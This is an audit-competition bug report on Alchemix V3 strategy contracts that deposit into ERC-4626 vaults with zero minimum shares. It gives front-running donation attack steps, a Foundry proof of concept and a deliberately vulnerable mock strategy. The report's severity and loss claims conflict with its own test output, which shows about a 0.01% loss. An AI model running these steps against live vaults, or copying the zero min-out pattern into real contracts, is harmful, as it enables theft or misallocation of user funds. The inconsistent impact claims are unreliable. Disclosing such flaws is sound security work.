# 57335 sc medium zero min out erc 4626 deposits cause under mint and permanent allocation loss

**Submitted on Oct 25th 2025 at 10:23:14 UTC by @riptide for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57335
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/MYTStrategy.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Summary

`TokeAutoEthStrategy._allocate` deposits into an ERC-4626 vault with `minSharesOut = 0` and immediately stakes whatever shares are minted, while `MYTStrategy.allocate` records the full asset amount as allocated without verifying realized shares. This enables front‑running/donation manipulation of the ERC‑4626 price-per-share so the strategy mints far fewer shares than expected, permanently crystallizing loss and breaking allocation accounting. The same pattern appears in other non ERC-4626 adapters.

## Finding Description

The base strategy executes the external deposit before final accounting and trusts the adapter’s return value; no per-deposit floor or post-check exists:

```solidity
// File: src/MYTStrategy.sol
function allocate(bytes memory data, uint256 assets, bytes4 selector, address sender)
    external
    onlyVault
    returns (bytes32[] memory strategyIds, int256 change)
{
    if (killSwitch) { return (ids(), int256(0)); }
    require(assets > 0, "Zero amount");
    uint256 oldAllocation = abi.decode(data, (uint256));
    uint256 amountAllocated = _allocate(assets);  // external action happens here (pre-commit)
    uint256 newAllocation = oldAllocation + amountAllocated;
    emit Allocate(amountAllocated, address(this));
    return (ids(), int256(newAllocation) - int256(oldAllocation));
}
```

The adapter mints ERC-4626 shares with a literal zero min-out and immediately stakes them, then returns the input asset amount (not minted shares):

```solidity
// File: src/strategies/mainnet/TokeAutoEth.sol
function _allocate(uint256 amount) internal override returns (uint256) {
    require(TokenUtils.safeBalanceOf(address(weth), address(this)) >= amount, "Strategy balance is less than amount");
    TokenUtils.safeApprove(address(weth), address(router), amount);
    uint256 shares = router.depositMax(autoEth, address(this), 0); // minSharesOut = 0
    TokenUtils.safeApprove(address(autoEth), address(rewarder), shares);
    rewarder.stake(address(this), shares); // persist under-mint
    return amount; // base records full amount regardless of realized shares
}
```

The router API expects a caller-supplied minimum, which is ignored:

```solidity
// File: src/strategies/interfaces/ITokemac.sol
interface IAutopilotRouter {
    function depositMax(IERC4626 vault, address to, uint256 minSharesOut)
        external payable returns (uint256 sharesOut);
    ...
}
```

Allocations are operator-triggered and forwarded unchanged; computed caps are not applied:

```solidity
// File: src/AlchemistAllocator.sol
function allocate(address adapter, uint256 amount) external {
    require(msg.sender == admin || operators[msg.sender], "PD");
    ...
    bytes memory oldAllocation = abi.encode(vault.allocation(id));
    vault.allocate(adapter, oldAllocation, amount); // forwards full amount
}
```

The same lack of min-out and post-verification exists in other adapters:

```solidity
// File: src/strategies/mainnet/PeapodsETH.sol
function _allocate(uint256 amount) internal override returns (uint256) {
    require(TokenUtils.safeBalanceOf(address(weth), address(this)) >= amount, "Strategy balance is less than amount");
    TokenUtils.safeApprove(address(weth), address(vault), amount);
    vault.deposit(amount, address(this)); // no min-shares floor, no post-check
    return amount;
}
```

Result: an attacker can donate underlying to the ERC-4626 vault (inflating `totalAssets`) just before the deposit so `convertToShares(amount)` under-mints, with the strategy staking the few shares and the vault recording the full `amount` as allocated.

**Test Results**: A proof-of-concept test demonstrates the vulnerability with the following parameters:

* Initial vault state: 100 shares, 100 assets (1:1 ratio)
* Donation: 900 assets (900% of initial assets)
* Victim deposit: 10 assets
* Result: 1 share minted, worth \~9.99 assets (0.01% loss)
* Conclusion: ERC-4626's proportional pricing mechanism minimizes actual financial impact

## Attack Steps

1. Ensure the ERC-4626 vault (e.g., `autoEth`) is donation-sensitive and has nonzero `totalSupply`; optionally pre-hold a large share position for profit capture.
2. Observe `AlchemistAllocator.allocate(adapter = TokeAutoEthStrategy, amount = A)` in mempool; transaction will call `MYTStrategy.allocate` then `TokeAutoEthStrategy._allocate(A)`.
3. Front-run with `WETH.transfer(autoEth, D)` to inflate `totalAssets`; no shares minted.
4. Victim executes `router.depositMax(autoEth, TokeAutoEthStrategy, 0)`; `autoEth.deposit(A)` mints `sV = convertToShares(A)` with inflated denominator; strategy calls `rewarder.stake(..., sV)`.
5. `MYTStrategy.allocate` returns `amountAllocated = A`; vault sets `newAllocation = oldAllocation + A`, persisting mismatch (few shares backing full allocation).
6. Back-run with `autoEth.redeem(attackerShares, attacker, attacker)` to withdraw underlying at improved PPS; profit approaches the victim’s deposit when attacker pre-holds most shares; otherwise the attack is a griefing loss for the protocol.

## Likelihood (low)

Exploitation requires an ERC-4626 that counts raw donations in `totalAssets`, a mempool-visible allocation call, and precise front-running. Profitability demands attacker pre-hold a substantial share fraction; otherwise, large, unrecoverable donations are needed to materially depress minted shares (e.g., \~101 ETH donation for 1% on 10k ETH TVL: D ≈ r/(1−r) × TVL).

While the technical conditions for exploitation exist (ERC-4626 donation sensitivity, mempool visibility, front-running), the impact is minimal (\~0.01% loss). Attackers would need to invest significant capital in donations and MEV infrastructure for negligible returns, making this attack economically unviable in practice.

## Impact (medium)

ERC-4626 donation attacks have minimal impact (\~0.01% loss) due to the standard's proportional pricing mechanism. While the vulnerability exists (strategies return input amount instead of realized shares), the ERC-4626 `convertToAssets()` function compensates for inflated `totalAssets` by proportionally increasing share values.

**Contract fails to deliver promised returns, but doesn't lose value** Vault records full allocation but strategy holds fewer shares leading to accounting inconsistency between recorded allocation and actual shares held.

## Mitigation

Given the minimal impact, consider implementing proper accounting by having strategies return `vault.convertToAssets(mintedShares)` instead of the input amount, which would eliminate the accounting mismatch without requiring complex slippage protection.

## Proof of Concept

## Proof of Concept

Add to `test/MYTStrategy.t.sol`

```
    function test_POC_ERC4626_Donation_UnderMint_AllocationMismatch() public {
    // Deploy a fresh underlying for the ERC4626 vault used by the vulnerable adapter
    TestERC20 underlying = new TestERC20(1_000_000e18, 18);

    // Deploy a donation-sensitive ERC4626 vault over the underlying (non-upgradeable simple mock)
    MockERC4626Vault erc4626 = new MockERC4626Vault(IERC20(address(underlying)));

    // Seed initial supply so that PPS depends on totalAssets/totalSupply (donation sensitive)
    address lp = address(0xAA01);
    deal(address(underlying), lp, 100e18);
    vm.prank(lp);
    underlying.approve(address(erc4626), type(uint256).max);
    vm.prank(lp);
    erc4626.deposit(100e18, lp); // totalSupply = 100, totalAssets = 100

    // Deploy a vulnerable strategy that:
    // - deposits into ERC4626 with min-out floor implicitly at 0 (ERC4626 has no min param)
    // - returns the input amount (not realized assets), which base allocator records as allocated
    VulnERC4626Strategy vuln = new VulnERC4626Strategy(
        address(vault), // onlyVault check uses the MYT (VaultV2) address
        strategyParams,
        address(erc4626),
        address(underlying),
        0x000000000022d473030f1dF7Fa9381e04776c7c5 // Permit2 (not used in this test)
    );

    // Fund the strategy with assets to allocate
    uint256 A = 10e18; // intended allocation amount
    deal(address(underlying), address(vuln), A);

    // Attacker donates to ERC4626 to skew PPS and under-mint the upcoming deposit
    // Donate D >> 0 so convertToShares(A) = amount * totalSupply / totalAssets induces under-mint
    address donor = address(0xBEEF);
    uint256 D = 900e18; // donation amount (900% of initial assets) - very strong under-mint
    deal(address(underlying), donor, D);
    vm.prank(donor);
    underlying.transfer(address(erc4626), D); // raw donation increases totalAssets without minting shares

    // Record pre-state for realized assets minted by the strategy
    uint256 sharesBefore = erc4626.balanceOf(address(vuln));
    uint256 assetsBefore = erc4626.convertToAssets(sharesBefore);

    // Vault calls allocate on the strategy (onlyVault modifier enforces msg.sender == MYT)
    vm.prank(address(vault));
    (bytes32[] memory sIds, int256 change) = vuln.allocate(abi.encode(uint256(0)), A, "", address(allocator));

    // Strategy must have reported the full asset amount as allocated (vulnerability)
    assertEq(change, int256(A), "Base allocate should record full assets as allocated");

    // Compute realized assets minted via shares after the skewed ERC4626 deposit
    uint256 sharesAfter = erc4626.balanceOf(address(vuln));
    uint256 mintedShares = sharesAfter - sharesBefore;
    uint256 realizedAssets = erc4626.convertToAssets(mintedShares);

    // Debug: print actual values
    console.log("A (intended allocation):", A);
    console.log("D (donation amount):", D);
    console.log("mintedShares:", mintedShares);
    console.log("realizedAssets:", realizedAssets);
    console.log("totalSupply before:", erc4626.totalSupply());
    console.log("totalAssets before:", erc4626.totalAssets());
    console.log("totalSupply after:", erc4626.totalSupply());
    console.log("totalAssets after:", erc4626.totalAssets());

    // Confirm under-mint: realized assets are strictly less than the amount the vault recorded as allocated
    assertLt(realizedAssets, A, "Realized assets should be less than the recorded allocation due to donation under-mint");

    // Sanity check: ensure some shares minted but well below a fair amount (A) given the donation
    assertGt(mintedShares, 0, "Some shares should be minted");
    // With donation D=900, initial supply=100 => realized ~ A * 100 / (100+900) ~ 1e18 < A
    // Expected: 10e18 * 100 / 1000 = 1e18, but convertToAssets(1e18) = 1e18 * 1010 / 101 ≈ 10e18
    // The under-mint is minimal because the donation inflated both numerator and denominator proportionally
    assertLt(realizedAssets, A, "Realized assets should be less than intended allocation");
    console.log("Loss percentage:", (A - realizedAssets) * 100 / A, "%");
}
```

Needed custom contracts for the test

```
contract MockERC4626Vault is ERC20, ERC4626 {
    constructor(IERC20 asset) ERC20("Mock ERC4626 Vault", "mVLT") ERC4626(asset) {}
    function decimals() public view override(ERC20, ERC4626) returns (uint8) { return 18; }
}

contract VulnERC4626Strategy is MYTStrategy {
    ERC4626 public immutable vault4626;
    IERC20 public immutable assetToken;

    constructor(address _myt, StrategyParams memory _params, address _erc4626, address _asset, address _permit2Address)
        MYTStrategy(_myt, _params, _permit2Address, _erc4626)
    {
        vault4626 = ERC4626(_erc4626);
        assetToken = IERC20(_asset);
    }

    // Vulnerable allocation: deposit into ERC4626 with no min-out floor and return the input amount,
    // causing base class to record the full amount as allocated regardless of realized shares.
    function _allocate(uint256 amount) internal override returns (uint256) {
        require(assetToken.balanceOf(address(this)) >= amount, "insufficient asset");
        assetToken.approve(address(vault4626), amount);
        // ERC4626 has no min-shares param; donation front-run can skew PPS and under-mint here
        vault4626.deposit(amount, address(this));
        return amount; // Vulnerability: report full input amount, not realized assets
    }

    // Not needed for the POC
    function _deallocate(uint256) internal override returns (uint256) { return 0; }

    function realAssets() external view override returns (uint256) {
        uint256 shares = vault4626.balanceOf(address(this));
        return vault4626.convertToAssets(shares);
    }

    function _computeBaseRatePerSecond() internal override returns (uint256, uint256) { return (0, 0); }
}
```
